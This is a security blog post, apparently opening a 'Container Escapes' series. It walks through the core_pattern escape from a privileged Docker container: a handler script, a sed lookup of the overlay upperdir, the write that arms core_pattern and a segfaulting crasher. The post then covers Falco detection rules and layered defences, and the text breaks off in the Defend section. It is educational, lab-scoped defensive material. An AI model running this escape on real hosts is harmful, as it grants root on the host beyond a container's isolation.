---
title: "Container Escapes: core_pattern"
categories:
  - notes
  - container
header:
  teaser: /assets/images/posts/container/container-teaser4.jpg
  overlay_image: assets/images/posts/container/container-header3.jpg
  overlay_filter: 0.5
excerpt: "How a privileged container escapes to the host through the kernel's core-dump handler, how Falco sees it, and how to shut it down."
description: "A privileged container writes core_pattern to run code as root on the host."
tags:
  - container
  - container-escapes
  - linux
  - security
  - offensive-security
---

# Intro

This post starts a new series: Container Escapes. Each post takes one escape technique and follows it through the same three phases: attack (run the escape), detect (watch it happen with runtime tooling), defend (the controls that stop it). One technique per post, start to finish.

It follows my earlier container posts, which were about building isolation from scratch (namespaces, cgroups, capabilities, seccomp). This series is about breaking that isolation when it is configured wrong, and then putting it back together.

First technique: the `core_pattern` escape from a privileged container. A few reasons I picked it to open the series. It is not a CVE, it has been public since around 2019, and it still works on a default Docker install. It also shows a specific kernel behavior clearly: sometimes the kernel runs a userspace program on your behalf, as root, and that becomes a problem when a container can choose which program.

## Threat model

The single misconfiguration is a privileged container.

```sh
docker run --privileged ...
```

`--privileged` is a bundle, and this escape only needs a few items from it. It is worth being exact about what has to be true for the write to turn into host code execution. Four gates plus a trigger, all of which `--privileged` provides at once:

1. **A writable `/proc/sys`.** The escape writes `/proc/sys/kernel/core_pattern`. `--privileged` mounts `/proc/sys` read-write. A default container mounts it read-only, and the write fails with `EROFS` before any permission check runs.
2. **uid 0 as the host sees it.** `core_pattern` is owned by root with mode `0644`, and the sysctl permission check hands the owner bits to the global root uid. A container without `userns-remap` runs as that uid, so ownership carries the write. A container with `CapEff: 0000000000000000` opens the file for writing. `CAP_SYS_ADMIN` applies one step earlier, to remounting a read-only `/proc/sys`.
3. **AppArmor allowing the write.** On Debian and Ubuntu the `docker-default` profile denies writes under `/proc/sys/kernel`, and it holds even with every capability granted and `/proc/sys` mounted read-write. `--privileged` runs the container unconfined. Hosts using SELinux have no equivalent rule here.
4. **The handler runs in a usable host context.** `call_usermodehelper` runs the named program as real host root in the host's namespaces. The attacker points it at a path inside the container's overlay `upperdir`, which is a real directory on the host. With `userns-remap` the daemon refuses to start a privileged container at all, so nothing reaches this stage.
5. **A core dump can be triggered.** The handler only runs when a process actually dumps core, so the attacker needs to crash something with a core-generating signal (`SIGSEGV`, `SIGABRT`).

The syscalls involved are few:

- `openat(2)` plus `write(2)` on `/proc/sys/kernel/core_pattern`, to arm the escape.
- `openat(2)` plus `write(2)` to drop the handler script.
- the crash itself, either a process that faults on its own or a `kill(2)` with `SIGSEGV` against an existing one.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 300" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="The core_pattern escape path. Writing the pipe handler to /proc/sys/kernel/core_pattern passes one gate: /proc/sys must be read-write, the process must run as the host's uid 0, and no AppArmor profile may deny the write. A triggered core dump then makes the kernel call_usermodehelper run the handler as real host root. Privileged opens the gate; a default container has it closed.">
  <defs>
    <marker id="cp-ar" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929c"/></marker>
  </defs>
  <rect x="10" y="95" width="175" height="90" rx="8" fill="#21262e" stroke="#3a4048" stroke-width="1.5"/>
  <text x="97" y="122" text-anchor="middle" fill="#eaeaea" font-size="12.5" font-weight="600">write |handler</text>
  <text x="97" y="142" text-anchor="middle" fill="#b9c0c8" font-size="10.5" font-family="monospace">/proc/sys/kernel/</text>
  <text x="97" y="157" text-anchor="middle" fill="#b9c0c8" font-size="10.5" font-family="monospace">core_pattern</text>

  <rect x="270" y="95" width="180" height="90" rx="8" fill="#21262e" stroke="#99058d" stroke-width="1.5"/>
  <text x="360" y="120" text-anchor="middle" fill="#d17bd0" font-size="12.5" font-weight="700">gate</text>
  <text x="360" y="142" text-anchor="middle" fill="#eaeaea" font-size="11" font-family="monospace">write(2)</text>
  <text x="360" y="158" text-anchor="middle" fill="#b9c0c8" font-size="10">/proc/sys rw + host uid 0</text>
  <text x="360" y="172" text-anchor="middle" fill="#b9c0c8" font-size="10">+ no AppArmor deny</text>

  <rect x="535" y="95" width="150" height="90" rx="8" fill="#21262e" stroke="#3a4048" stroke-width="1.5"/>
  <text x="610" y="126" text-anchor="middle" fill="#eaeaea" font-size="12.5" font-weight="600">core dump</text>
  <text x="610" y="146" text-anchor="middle" fill="#b9c0c8" font-size="10.5">crash a process</text>

  <rect x="770" y="95" width="100" height="90" rx="8" fill="#3a1416" stroke="#e5484d" stroke-width="1.8"/>
  <text x="820" y="122" text-anchor="middle" fill="#ff6b70" font-size="12" font-weight="700">host root</text>
  <text x="820" y="142" text-anchor="middle" fill="#eaeaea" font-size="10">handler runs</text>
  <text x="820" y="157" text-anchor="middle" fill="#eaeaea" font-size="10">as real root</text>

  <line x1="187" y1="140" x2="267" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#cp-ar)"/>
  <line x1="452" y1="140" x2="532" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#cp-ar)"/>
  <line x1="687" y1="140" x2="767" y2="140" stroke="#8a929c" stroke-width="1.8" marker-end="url(#cp-ar)"/>
  <text x="610" y="80" text-anchor="middle" fill="#8a929c" font-size="10.5">kernel call_usermodehelper</text>

  <text x="440" y="235" text-anchor="middle" fill="#8a929c" font-size="11.5">--privileged opens the gate and leaves /proc/sys writable</text>
  <text x="440" y="255" text-anchor="middle" fill="#8a929c" font-size="11.5">a default container mounts /proc/sys read-only, so the write never lands</text>
</svg>
</div>

> [!] This does not apply to a default container. A default Docker container mounts `/proc/sys` read-only and keeps the AppArmor profile that denies writes under `/proc/sys/kernel`. The write fails with `EROFS` before the handler ever comes up. The attack assumes the privilege was already handed over.

A privileged container can escape in several ways. This post covers one of them, `core_pattern`, because the mechanism is easy to follow end to end.

---

# Background: how the kernel runs programs for you

## Usermode helpers

Most of the time the flow is one-way: your process asks the kernel to do things through syscalls. In a few places the kernel needs to run a userspace program to finish a job, and it runs that program from kernel context, as root, in the host's namespaces. This mechanism is called a usermode helper (`call_usermodehelper` in the source).

x86 defines four privilege rings. Linux uses only two: ring 3 for user code and ring 0 for the kernel. A syscall crosses from ring 3 into ring 0, a process asking the kernel to act. A usermode helper crosses the other way: the kernel, running in ring 0, spawns a fresh ring 3 process itself, as root, in the initial namespaces.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 410" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="x86 protection rings on Linux. Ring 3 is user mode, ring 0 is the kernel, rings 1 and 2 are unused. A syscall crosses from ring 3 into ring 0. call_usermodehelper goes the other way: the kernel in ring 0 spawns a new ring 3 process as root in the host namespaces.">
  <defs>
    <marker id="ar1" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929c"/></marker>
    <marker id="ar2" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#e5484d"/></marker>
  </defs>
  <!-- concentric rings -->
  <circle cx="210" cy="205" r="162" fill="#20252d" stroke="#3a4048" stroke-width="1.5"/>
  <circle cx="210" cy="205" r="122" fill="#1b1f26" stroke="#2b3138" stroke-width="1.2"/>
  <circle cx="210" cy="205" r="82"  fill="#191d24" stroke="#2b3138" stroke-width="1.2"/>
  <circle cx="210" cy="205" r="44"  fill="#2a1230" stroke="#99058d" stroke-width="1.8"/>
  <!-- ring labels -->
  <text x="210" y="60"  text-anchor="middle" fill="#eaeaea" font-size="13" font-weight="600">Ring 3 &middot; user mode</text>
  <text x="210" y="100" text-anchor="middle" fill="#6a727c" font-size="11.5">Ring 2 &middot; unused</text>
  <text x="210" y="140" text-anchor="middle" fill="#6a727c" font-size="11.5">Ring 1 &middot; unused</text>
  <text x="210" y="201" text-anchor="middle" fill="#d17bd0" font-size="13" font-weight="700">Ring 0</text>
  <text x="210" y="218" text-anchor="middle" fill="#d17bd0" font-size="11">kernel</text>
  <!-- syscall arrow (inward) -->
  <line x1="470" y1="135" x2="360" y2="150" stroke="#8a929c" stroke-width="1.8" marker-end="url(#ar1)"/>
  <circle cx="470" cy="108" r="11" fill="#21262e" stroke="#8a929c" stroke-width="1.2"/>
  <text x="470" y="112" text-anchor="middle" fill="#eaeaea" font-size="12" font-weight="700">1</text>
  <text x="492" y="105" fill="#eaeaea" font-size="13" font-weight="600">syscall</text>
  <text x="492" y="124" fill="#8a929c" font-size="11.5">process asks kernel to act (ring 3 &rarr; ring 0)</text>
  <!-- usermodehelper arrow (outward) -->
  <path d="M245,238 Q400,360 545,322" fill="none" stroke="#e5484d" stroke-width="1.8" marker-end="url(#ar2)"/>
  <circle cx="470" cy="270" r="11" fill="#3a1416" stroke="#e5484d" stroke-width="1.2"/>
  <text x="470" y="274" text-anchor="middle" fill="#ff6b70" font-size="12" font-weight="700">2</text>
  <text x="492" y="267" fill="#eaeaea" font-size="13" font-weight="600" font-family="monospace">call_usermodehelper</text>
  <text x="492" y="286" fill="#8a929c" font-size="11.5">kernel spawns a program as root (ring 0 &rarr; ring 3)</text>
  <!-- spawned root process box -->
  <rect x="560" y="300" width="300" height="46" rx="8" fill="#3a1416" stroke="#e5484d" stroke-width="1.5"/>
  <text x="710" y="320" text-anchor="middle" fill="#ff6b70" font-size="12.5" font-weight="700">root process</text>
  <text x="710" y="337" text-anchor="middle" fill="#b9c0c8" font-size="11">ring 3, host namespaces, real host root</text>
</svg>
</div>

Some examples that share this pattern:

- `/proc/sys/kernel/modprobe`: the program run when the kernel auto-loads a module.
- `/sys/fs/cgroup/.../release_agent`: the program run when a cgroup empties (cgroup v1). This is the older container escape.
- `/proc/sys/kernel/core_pattern`: the program run to handle a core dump.

Each one is a file whose contents are a command the host kernel will execute as root. If a container can write one of these files and then trigger the matching event, it runs code on the host. `release_agent` is cgroup v1 only and mostly gone on modern systems. `core_pattern` does not depend on cgroups and is still present everywhere.

All three funnel through the same kernel machinery. `call_usermodehelper` takes a path and arg vector and hands them to a helper kthread, which is a child of `kthreadd` (the kernel's thread spawner) and therefore runs as root in the initial namespaces, not in whatever container triggered it:

```c
// kernel/umh.c
int call_usermodehelper(const char *path, char **argv, char **envp, int wait)
{
	struct subprocess_info *info;
	gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;

	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,
					 NULL, NULL, NULL);
	if (info == NULL)
		return -ENOMEM;

	return call_usermodehelper_exec(info, wait);
}
```

`release_agent` takes exactly that path. The core-dump path (`do_coredump` in `fs/coredump.c`) uses the two halves directly: when `core_pattern` begins with `|` it parses the rest into `argv`, calls `call_usermodehelper_setup()` with an extra init callback, `umh_pipe_setup`, and passes the result to `call_usermodehelper_exec()`. The callback is what connects the dump to the handler's stdin. Either way `path` is attacker-controlled, and the process it launches never sees the container.

## core_pattern and core dumps

When a process crashes with a core-generating signal (`SIGSEGV`, `SIGABRT`, and others), the kernel can write a memory image called a core dump. Where it goes is controlled by `/proc/sys/kernel/core_pattern`.

```sh
$ cat /proc/sys/kernel/core_pattern
core
```

That is the default: dump to a file called `core`. The value has a second mode. If it starts with a pipe `|`, the kernel executes the program named after the pipe and streams the core dump to its stdin instead of writing a file.

```sh
# "on any core dump, run /usr/bin/handler with these args"
|/usr/bin/handler %p %s %e
```

The `%` tokens are substitutions (`%p` = pid, `%s` = signal, `%e` = exe name). The relevant behavior is that the kernel executes the program.

> [!] Systems using systemd-coredump, and WSL2 in my case, already ship a pipe handler by default. The pipe syntax is how core dumps are routed on most machines today.

## Why it crosses the container boundary

Two facts make this an escape:

`core_pattern` is a single host-global kernel setting. It is not namespaced, so there is one value for the whole machine, containers included. And the handler it names runs in the host's context: host mount namespace, host PID namespace, real host root.

So a process inside a container that can write `/proc/sys/kernel/core_pattern` is editing the host's own setting. The next core dump anywhere, including one the attacker triggers inside the container, makes the host kernel execute the attacker's program as root, outside the container.

---

# Attack

## Lab setup

Throwaway VM, default Docker. Do not run this on anything you care about, since it rewrites a host-global kernel setting.

{% raw %}
```sh
# confirm this is a default docker: overlay2 storage, no userns-remap
$ docker info --format '{{.Driver}} {{.SecurityOptions}}'
overlay2 [name=seccomp,profile=builtin name=cgroupns]
```
{% endraw %}

> [!] `name=userns` must not be present. With userns-remap enabled the daemon rejects the container before it starts: `privileged mode is incompatible with user namespaces. You must run the container in the host namespace when running privileged mode`. I cover this in the Defend section.

Save the host value so we can restore it:

```sh
$ cat /proc/sys/kernel/core_pattern | sudo tee /root/core_pattern.orig
```

Start the vulnerable container:

```sh
$ docker run --rm -it --privileged ubuntu:22.04 bash
```

## Recon

First step inside an unknown container: check how restricted you are. No external tool needed, just `/proc`.

```sh
# how many capabilities do we hold?
root@ctr:/# grep CapEff /proc/self/status
CapEff: 000001ffffffffff
```

`000001ffffffffff` is the full set, every capability Docker grants, which points at a privileged container. The sysctl write itself needs none of them. What the capabilities buy here is the option to remount `/proc/sys` read-write if you find it read-only.

```sh
# is /proc/sys writable? (the second precondition)
root@ctr:/# : >> /proc/sys/kernel/core_pattern && echo writable
writable
```

`: >>` opens the file for append and writes nothing, so the host value stays as it is. A default container answers `Read-only file system`. Under an AppArmor profile the answer is `Permission denied`.

Both preconditions are met: the host's own uid 0 and a writable `/proc/sys`.

## The escape

Three steps: drop a payload, tell the kernel to run it on the next core dump, then cause a core dump.

**1. The payload.** A script that, when run by the host kernel as root, records enough to prove it ran on the host, and leaves the output where the container can read it.

```sh
cat > /handler.sh <<'EOF'
#!/bin/sh
{
  echo "handler ran as: $(id)"
  echo "host uname: $(uname -a)"
  echo "host /etc/hostname: $(cat /etc/hostname)"
  echo "host PID1: $(tr '\0' ' ' < /proc/1/cmdline)"
  echo "host / listing: $(ls /)"
} > /OUTPUT_PLACEHOLDER/proof.txt 2>&1
EOF
chmod +x /handler.sh
```

**2. Find where the container's filesystem lives on the host.** The container root is an overlay mount, and its writable layer (`upperdir`) is a real directory on the host. We can read its host path from our own mount table:

```sh
UPPER=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$UPPER"
# /var/lib/docker/overlay2/<hash>/diff

sed -i "s#/OUTPUT_PLACEHOLDER#$UPPER#" /handler.sh
```

> [!] The `upperdir` works in both directions. A file the host handler writes to `$UPPER/proof.txt` appears inside the container at `/proof.txt`, because that directory is the container's writable layer. It is the same file under two paths.

**3. Arm and fire.** Point `core_pattern` at the handler using its host path, then crash a process.

```sh
echo "|$UPPER/handler.sh" > /proc/sys/kernel/core_pattern

# a tiny program whose only job is to segfault
printf 'int main(){*(volatile int*)0=0;return 0;}' > /crash.c
apt-get install -y gcc >/dev/null 2>&1
gcc -o /crash /crash.c
ulimit -c unlimited
/crash
```

`/crash` dereferences a null pointer, the kernel starts a core dump, sees the pipe in `core_pattern`, and runs our handler as host root.

> [!] On a default host the `#!/bin/sh` handler works, because the usermode helper can resolve `/bin/sh`. If dmesg shows `pipe failed`, compile a static binary instead and point `core_pattern` at that ELF, which needs no interpreter. That is what happened to me on WSL2.

## Proof

Read the file back from inside the container:

```sh
root@ctr:/# cat /proof.txt
handler ran as: uid=0(root) gid=0(root) groups=0(root)
host uname: Linux debian-lab 6.1.0-... x86_64 GNU/Linux
host /etc/hostname: debian-lab
host PID1: /sbin/init
host / listing: bin boot dev etc home lib ... root run sbin srv sys tmp usr var
```

Those are the host's hostname, the host's `init` as PID 1, and the host's root listing.

`dmesg` covers only the failure case. The kernel logs a line when the helper cannot be executed:

```sh
$ dmesg | tail -1
Core dump to |/var/lib/docker/overlay2/<hash>/diff/handler.sh pipe failed
```

That line means the handler never ran. A successful run logs nothing, so `/proof.txt` above is the confirmation.

---

# Detect

If you defend systems, the useful question is whether you would have seen this happen. So I put [Falco](https://falco.org/) in front of the same attack. Falco is a CNCF runtime-security tool that taps the kernel through an eBPF probe and matches syscall activity against rules.

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 300" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Falco detection pipeline: a write to core_pattern inside the container becomes an open_write syscall, seen by the eBPF probe, matched by the Falco engine, raising a CRITICAL T1611 alert before the crash happens.">
  <defs>
    <marker id="ah" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#7a828c"/>
    </marker>
  </defs>
  <!-- stage boxes -->
  <g>
    <rect x="10"  y="70" width="150" height="90" rx="8" fill="#21262e" stroke="#99058d" stroke-width="1.5"/>
    <text x="85" y="98"  text-anchor="middle" fill="#eaeaea" font-size="13" font-weight="600">Inside container</text>
    <text x="85" y="120" text-anchor="middle" fill="#b9c0c8" font-size="11" font-family="monospace">echo "|handler"</text>
    <text x="85" y="136" text-anchor="middle" fill="#b9c0c8" font-size="11" font-family="monospace">&gt; core_pattern</text>
  </g>
  <g>
    <rect x="255" y="70" width="150" height="90" rx="8" fill="#21262e" stroke="#3a4048" stroke-width="1.5"/>
    <text x="330" y="104" text-anchor="middle" fill="#eaeaea" font-size="13" font-weight="600">eBPF probe</text>
    <text x="330" y="126" text-anchor="middle" fill="#b9c0c8" font-size="11">kernel syscall tap</text>
  </g>
  <g>
    <rect x="500" y="70" width="150" height="90" rx="8" fill="#21262e" stroke="#3a4048" stroke-width="1.5"/>
    <text x="575" y="98"  text-anchor="middle" fill="#eaeaea" font-size="13" font-weight="600">Falco engine</text>
    <text x="575" y="120" text-anchor="middle" fill="#b9c0c8" font-size="11">match against</text>
    <text x="575" y="136" text-anchor="middle" fill="#b9c0c8" font-size="11">ruleset</text>
  </g>
  <g>
    <rect x="720" y="70" width="150" height="90" rx="8" fill="#3a1416" stroke="#e5484d" stroke-width="1.8"/>
    <text x="795" y="98"  text-anchor="middle" fill="#ff6b70" font-size="13" font-weight="700">CRITICAL</text>
    <text x="795" y="120" text-anchor="middle" fill="#eaeaea" font-size="11">alert raised</text>
    <text x="795" y="136" text-anchor="middle" fill="#b9c0c8" font-size="10.5" font-family="monospace">T1611 Escape</text>
  </g>
  <!-- arrows -->
  <line x1="162" y1="115" x2="252" y2="115" stroke="#7a828c" stroke-width="1.8" marker-end="url(#ah)"/>
  <text x="207" y="106" text-anchor="middle" fill="#8a929c" font-size="10" font-family="monospace">open_write</text>
  <line x1="407" y1="115" x2="497" y2="115" stroke="#7a828c" stroke-width="1.8" marker-end="url(#ah)"/>
  <line x1="652" y1="115" x2="717" y2="115" stroke="#7a828c" stroke-width="1.8" marker-end="url(#ah)"/>
  <!-- timing note -->
  <line x1="85" y1="185" x2="85" y2="215" stroke="#e5484d" stroke-width="1.5" stroke-dasharray="4 3"/>
  <line x1="795" y1="185" x2="795" y2="215" stroke="#e5484d" stroke-width="1.5" stroke-dasharray="4 3"/>
  <line x1="85" y1="215" x2="795" y2="215" stroke="#e5484d" stroke-width="1.5"/>
  <text x="440" y="240" text-anchor="middle" fill="#ff6b70" font-size="12" font-weight="600">Alert fires on the write itself</text>
  <text x="440" y="260" text-anchor="middle" fill="#8a929c" font-size="11">before the process crash and core dump are ever triggered</text>
</svg>
</div>

## Default rules

I ran Falco with only its stable default ruleset and repeated the attack. It fired:

```json
{
    "priority": "Notice",
    "rule": "Terminal shell in container",
    "output": "... process=bash container_image=ubuntu:22.04 ...",
    "source": "syscall"
}
```

```json
{
    "priority": "Critical",
    "rule": "Drop and execute new binary in container",
    "output": "... command=gcc -o /crash /crash.c ... container_name=peaceful_kare ...",
    "tags": [
        "PCI_DSS_11.5.1",
        "TA0003",
        "container",
        "mitre_persistence",
        "process"
    ]
}
```

It caught the `bash` shell, and it caught `gcc`/`as`/`ld`/`/crash` under "Drop and execute new binary in container" (one alert per compiler stage).

What it did not catch was the write to `/proc/sys/kernel/core_pattern`. The action that performs the escape produced no alerts. `Launch Privileged Container` did not fire either, because that rule ships in the incubating maturity tier, which the stable ruleset does not load.

Those side effects, compiling and running a new binary, come from how I wrote the PoC, and they are easy to remove. Ship a static prebuilt crasher and there is no compiler step. Crash an existing base-image process (`kill -SEGV` on something already running) and there is no new binary. In that case default Falco produces no alerts while the escape still works.

## A rule that catches the mechanism

The escape is the write to `core_pattern`, so that is what the rule should watch: the file itself.

```yaml
- rule: Write to core_pattern from container
  desc: >
    A process inside a container opened /proc/sys/kernel/core_pattern for write.
    core_pattern is a host-global sysctl whose pipe handler the kernel executes
    as root on any core dump. Writing it from a container is a privileged-container
    escape primitive (T1611). Stable Falco default rules do not cover this file.
  condition: >
    open_write and container
    and fd.name = /proc/sys/kernel/core_pattern
  output: >
    core_pattern modified from inside a container
    (file=%fd.name proc=%proc.cmdline user=%user.name
     container=%container.name image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

It reuses Falco's built-in `open_write` macro, scopes to `container`, and matches the one path that matters. I added a second, broader rule for the same class (`modprobe` and `release_agent`, the other usermode-helper files), so the coverage is not tied to a single path.

Load it:
```sh
docker run --rm -i --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /etc:/host/etc:ro \
  -v "$PWD/core_pattern_rule.yaml:/etc/falco/rules.d/core_pattern.yaml:ro" \
  falcosecurity/falco:latest \
  falco -o json_output=true -o json_include_output_property=true \
  2>&1 | tee ~/falco-round2.json
```
Run the escape in the other shell, Ctrl-C Falco, then pull the one line:
```sh
grep core_pattern ~/falco-round2.json
```

Now it gets it:

```json
{
    "priority": "Critical",
    "rule": "Write to core_pattern from container",
    "output": "core_pattern modified from inside a container (file=/proc/sys/kernel/core_pattern proc=bash user=root container=naughty_neumann image=ubuntu:22.04)",
    "output_fields": {
        "fd.name": "/proc/sys/kernel/core_pattern",
        "proc.cmdline": "bash",
        "container.image.repository": "ubuntu",
        "container.image.tag": "22.04",
        "user.name": "root"
    },
    "source": "syscall",
    "tags": [
        "T1611",
        "container",
        "escape",
        "mitre_privilege_escalation"
    ]
}
```

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 210" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Falco alert card. Priority CRITICAL. Rule: Write to core_pattern from container. Fields: file /proc/sys/kernel/core_pattern, proc bash, user root, container naughty_neumann, image ubuntu 22.04. Tagged T1611.">
  <rect x="10" y="10" width="860" height="190" rx="10" fill="#1c2027" stroke="#e5484d" stroke-width="1.5"/>
  <rect x="10" y="10" width="6" height="190" rx="3" fill="#e5484d"/>
  <!-- header -->
  <rect x="32" y="28" width="86" height="26" rx="13" fill="#3a1416" stroke="#e5484d" stroke-width="1.2"/>
  <text x="75" y="46" text-anchor="middle" fill="#ff6b70" font-size="12.5" font-weight="700">CRITICAL</text>
  <text x="132" y="46" fill="#eaeaea" font-size="15" font-weight="700" font-family="monospace">Write to core_pattern from container</text>
  <line x1="32" y1="70" x2="848" y2="70" stroke="#3a4048" stroke-width="1"/>
  <!-- fields -->
  <g font-size="12.5" font-family="monospace">
    <text x="32"  y="98"  fill="#8a929c">file</text>     <text x="130" y="98"  fill="#eaeaea">/proc/sys/kernel/core_pattern</text>
    <text x="32"  y="122" fill="#8a929c">proc</text>     <text x="130" y="122" fill="#eaeaea">bash</text>
    <text x="32"  y="146" fill="#8a929c">user</text>     <text x="130" y="146" fill="#eaeaea">root</text>
    <text x="470" y="98"  fill="#8a929c">container</text><text x="600" y="98"  fill="#eaeaea">naughty_neumann</text>
    <text x="470" y="122" fill="#8a929c">image</text>    <text x="600" y="122" fill="#eaeaea">ubuntu:22.04</text>
    <text x="470" y="146" fill="#8a929c">source</text>   <text x="600" y="146" fill="#eaeaea">syscall</text>
  </g>
  <!-- tags -->
  <rect x="32"  y="164" width="70" height="24" rx="12" fill="#2a1230" stroke="#99058d" stroke-width="1"/>
  <text x="67"  y="181" text-anchor="middle" fill="#d17bd0" font-size="11.5" font-family="monospace">T1611</text>
  <rect x="112" y="164" width="90" height="24" rx="12" fill="#21262e" stroke="#3a4048" stroke-width="1"/>
  <text x="157" y="181" text-anchor="middle" fill="#b9c0c8" font-size="11.5" font-family="monospace">container</text>
  <rect x="212" y="164" width="70" height="24" rx="12" fill="#21262e" stroke="#3a4048" stroke-width="1"/>
  <text x="247" y="181" text-anchor="middle" fill="#b9c0c8" font-size="11.5" font-family="monospace">escape</text>
</svg>
</div>

The escape now raises a CRITICAL alert, on the `echo > core_pattern` line, tagged `T1611` (MITRE: Escape to Host).

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 340" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Comparison. Round 1 with default rules catches the terminal shell and the new binary compilation but misses the write to core_pattern. Round 2 with the custom rule catches the core_pattern write itself.">
  <!-- ROUND 1 -->
  <rect x="10" y="10" width="415" height="320" rx="10" fill="#1c2027" stroke="#3a4048" stroke-width="1.5"/>
  <text x="30" y="42" fill="#eaeaea" font-size="15" font-weight="700">Round 1 - default rules</text>
  <text x="30" y="63" fill="#8a929c" font-size="11.5">stable ruleset only</text>

  <g font-size="12.5">
    <circle cx="42" cy="98" r="9" fill="#153a1e"/><path d="M37,98 l3.5,3.5 l6-7" stroke="#46a758" stroke-width="2" fill="none"/>
    <text x="62" y="94" fill="#eaeaea" font-weight="600">Terminal shell in container</text>
    <text x="62" y="112" fill="#8a929c" font-size="11">Notice - caught the bash shell</text>

    <circle cx="42" cy="150" r="9" fill="#153a1e"/><path d="M37,150 l3.5,3.5 l6-7" stroke="#46a758" stroke-width="2" fill="none"/>
    <text x="62" y="146" fill="#eaeaea" font-weight="600">Drop and execute new binary</text>
    <text x="62" y="164" fill="#8a929c" font-size="11">Critical - gcc / as / ld / crash</text>

    <circle cx="42" cy="210" r="9" fill="#3a1416"/><path d="M38,206 l8,8 M46,206 l-8,8" stroke="#e5484d" stroke-width="2"/>
    <text x="62" y="206" fill="#ff6b70" font-weight="700">Write to core_pattern</text>
    <text x="62" y="224" fill="#8a929c" font-size="11">NOT DETECTED - the escape itself</text>
  </g>
  <text x="30" y="290" fill="#b9c0c8" font-size="11.5" font-style="italic">Only the noise around the PoC.</text>
  <text x="30" y="308" fill="#b9c0c8" font-size="11.5" font-style="italic">Static binary + kill -SEGV &rarr; silent.</text>

  <!-- ROUND 2 -->
  <rect x="455" y="10" width="415" height="320" rx="10" fill="#1c2027" stroke="#99058d" stroke-width="1.8"/>
  <text x="475" y="42" fill="#eaeaea" font-size="15" font-weight="700">Round 2 - + custom rule</text>
  <text x="475" y="63" fill="#8a929c" font-size="11.5">watch the escape</text>

  <g font-size="12.5">
    <circle cx="487" cy="150" r="9" fill="#3a1416"/><path d="M482,150 l3.5,3.5 l6-7" stroke="#ff6b70" stroke-width="2" fill="none"/>
    <text x="507" y="146" fill="#ff6b70" font-weight="700">Write to core_pattern from container</text>
    <text x="507" y="165" fill="#eaeaea" font-size="11.5">CRITICAL - fires on the open_write</text>
    <text x="507" y="182" fill="#8a929c" font-size="11">tagged T1611 (Escape to Host)</text>
  </g>
  <rect x="475" y="205" width="375" height="1" fill="#3a4048"/>
  <text x="475" y="240" fill="#b9c0c8" font-size="11.5" font-style="italic">Matches the one path that performs</text>
  <text x="475" y="258" fill="#b9c0c8" font-size="11.5" font-style="italic">the escape - independent of how the</text>
  <text x="475" y="276" fill="#b9c0c8" font-size="11.5" font-style="italic">core dump is triggered.</text>
</svg>
</div>

## Detection gaps

Being clear about what the rule covers:

- It matches the open-for-write, so it fires the moment `core_pattern` is opened for writing, before any crash is triggered.
- It will not catch a write through a path that does not resolve to `/proc/sys/kernel/core_pattern` as Falco sees it (bind-mount tricks, for example). 

> Falco alerts after the write happens, so it does not stop the escape.

---

# Defend

## The single misconfiguration

Everything traced back to one flag: `--privileged`. Remove it and every gate from the threat model closes at once. The first defense is simple: do not run privileged containers. Most workloads do not need it.

> "Do not misconfigure it" is not enough on its own. Defense in depth means the escape should fail even if one layer is wrong. Here is what each independent control does to this specific attack.

## Layered defenses

<div style="margin:1.5em 0;overflow-x:auto;">
<svg viewBox="0 0 880 436" width="100%" style="max-width:880px;height:auto;display:block;margin:0 auto;font-family:-apple-system,Segoe UI,Roboto,sans-serif;" role="img" aria-label="Layered defenses. no --privileged removes every precondition at once. a read-only /proc/sys makes the write fail with EROFS. the AppArmor docker-default profile denies writes under /proc/sys/kernel. userns-remap makes the daemon refuse privileged containers. dropping CAP_SYS_ADMIN only prevents remounting /proc/sys read-write. the seccomp default profile blocks neighbouring escape syscalls like init_module. no_new_privs prevents privilege regain across exec.">
  <rect x="10" y="10" width="860" height="416" rx="10" fill="#1c2027" stroke="#3a4048" stroke-width="1.5"/>
  <!-- header -->
  <text x="34" y="42" fill="#8a929c" font-size="12" font-weight="700" letter-spacing="1">CONTROL</text>
  <text x="330" y="42" fill="#8a929c" font-size="12" font-weight="700" letter-spacing="1">EFFECT ON THIS ESCAPE</text>
  <line x1="24" y1="56" x2="856" y2="56" stroke="#3a4048" stroke-width="1"/>
  <line x1="312" y1="56" x2="312" y2="416" stroke="#3a4048" stroke-width="1"/>

  <!-- rows -->
  <g font-family="monospace" font-size="13">
    <rect x="24"  y="66"  width="288" height="50" fill="#20252d"/>
    <text x="34"  y="96"  fill="#d17bd0" font-weight="700">no --privileged</text>
